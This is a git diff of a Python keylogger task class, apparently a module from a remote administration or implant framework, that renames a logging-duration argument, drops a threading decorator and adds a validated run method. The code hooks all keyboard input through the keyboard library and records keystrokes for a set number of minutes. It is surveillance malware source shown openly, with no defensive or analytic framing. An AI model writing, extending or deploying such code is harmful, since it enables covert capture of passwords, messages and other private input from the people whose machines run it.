@@ -1,5 +1,4 @@
 from tasks.__task import Task
-from utils import threaded_task
 
 
 class KeyLogger(Task):
@@ -8,7 +7,7 @@ class KeyLogger(Task):
     description = __doc__
     administrator = {"win32": False, "linux": True, "darwin": True}
     kwargs = {"buffer": {"type": int, "description": "Maximum length of one string of keys.", "default": 100},
-              "time_to_log": {"type": int, "description": "Time to record pressed keys in minutes.", "default": 15}}
+              "log_time": {"type": int, "description": "Time to record pressed keys in minutes.", "default": 15}}
 
     def __init__(self, task_id):
         super(KeyLogger, self).__init__(task_id)
@@ -22,14 +21,22 @@ class KeyLogger(Task):
         self._run = threading.Event()
         self.hook = None
 
-    @threaded_task
-    def start(self, time_to_log=15, buffer=100):
+    def run(self, **kwargs):
+        assert "log_time" in kwargs, "Missing keyword agument log_time!"
+        assert "buffer" in kwargs, "Missing keyword argument buffer!"
+
+        log_time = int(kwargs.get("log_time"))
+        buffer = int(kwargs.get("buffer"))
+
+        assert log_time > 0, "Log time must be greater than 0!"
+        assert buffer > 0, "Buffer must be greater than 0!"
+
         from queue import Queue, Empty
         import datetime
         import keyboard
 
         start_time = datetime.datetime.now()
-        time_delta = datetime.timedelta(minutes=time_to_log)
+        time_delta = datetime.timedelta(minutes=log_time)
         que = Queue(maxsize=1)
         self.hook = keyboard.hook(que.put)
         self._run.set()
